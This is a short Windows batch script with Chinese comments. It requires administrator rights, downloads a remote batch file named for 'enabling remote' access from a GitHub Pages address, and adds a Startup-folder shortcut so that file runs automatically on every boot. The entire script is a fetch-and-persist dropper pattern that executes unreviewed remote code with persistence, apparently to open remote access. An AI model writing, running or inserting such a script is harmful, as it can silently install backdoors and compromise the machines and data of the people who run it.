@echo off
:: 检查管理员权限
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo 请以管理员身份运行
    pause
    exit /b
)

:: 下载文件到桌面
echo 正在下载...
powershell -Command "Invoke-WebRequest -Uri 'https://mingyuemc.github.io/wenjian/kaiqiyuancheng.bat' -OutFile '%userprofile%\Desktop\kaiqiyuancheng.bat'"

:: 获取启动文件夹路径
set "startup=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"

:: 创建快捷方式并放入启动文件夹
echo 正在设置开机自启动...
powershell -Command "$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%startup%\kaiqiyuancheng.lnk'); $Shortcut.TargetPath = '%userprofile%\Desktop\kaiqiyuancheng.bat'; $Shortcut.Save()"

echo 完成！重启电脑后会自动执行该脚本
pause
